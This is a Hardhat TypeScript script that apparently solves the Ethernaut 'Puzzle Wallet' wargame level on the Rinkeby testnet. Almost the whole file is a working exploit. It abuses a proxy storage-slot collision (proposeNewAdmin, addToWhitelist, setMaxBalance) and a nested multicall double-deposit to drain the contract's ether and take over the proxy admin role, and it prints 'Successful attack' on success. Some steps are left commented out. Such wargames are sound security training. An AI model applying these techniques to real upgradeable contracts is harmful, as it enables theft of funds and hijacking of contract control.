import "@ethersproject/abstract-provider"
import { ethers, getNamedAccounts, network } from "hardhat"


import * as dotenv from 'dotenv'
import { BigNumber } from "ethers"
dotenv.config()


const executeExploit= async()=>{
    if(network.name==="rinkeby"){
        const {exploiter}=await getNamedAccounts()
        const exploiterAcc=await ethers.getSigner(exploiter)
        const puzzleProxy= await ethers.getContractAt('PuzzleProxy',process.env.PUZZLE_WALLET_ADDRESS as string)
        const puzzleWalletProxy= await ethers.getContractAt('PuzzleWallet',process.env.PUZZLE_WALLET_ADDRESS as string)

        //We change puzzleWallet owner by changing the corresponding slot
        //const proposeTx=await puzzleProxy.connect(exploiterAcc).proposeNewAdmin(exploiter,{
        //    gasLimit: 300000
        //})
        //await proposeTx.wait()

        //We add ourselves to the whitelist
        //const whitelistAddTx=await puzzleWalletProxy.connect(exploiterAcc).addToWhitelist(exploiter,{
        //    gasLimit: 300000
        //})
        //await whitelistAddTx.wait()
        
        // We encode our tx to send in orden to produce a double deposit with half of the ether we are meant to need
        const depositEncodedData= puzzleWalletProxy.interface.encodeFunctionData("deposit")
        const multicallDepositEncodedData=puzzleWalletProxy.interface.encodeFunctionData("multicall",[[depositEncodedData]])
        //const depositTx=await puzzleWalletProxy.connect(exploiterAcc).multicall([multicallDepositEncodedData,multicallDepositEncodedData],{
        //    value: BigNumber.from(`1${"0".repeat(15)}`),
        //    gasLimit: 400000
        //})
        //await depositTx.wait()

        //We extract all the ether in the contract
        //const extractionTx=await puzzleWalletProxy.connect(exploiterAcc).execute(exploiter,await puzzleWalletProxy.balances(exploiter),BigNumber.from(0),{
        //    gasLimit: 400000
        //})
        //await extractionTx.wait()
        
        const maxBalanceSetting=await puzzleWalletProxy.connect(exploiterAcc).setMaxBalance(BigNumber.from(exploiter),{
            gasLimit: 400000
        })
        await maxBalanceSetting.wait()

        if(await puzzleProxy.admin() === exploiter){
            console.log("Successful attack")
        }else{
            console.log("Attack failed")
        }
    }else{
        console.log("This script can only be executed in rinkeby network")
    }
}

executeExploit().then(()=>process.exit(0)).catch(err=>console.log(err))
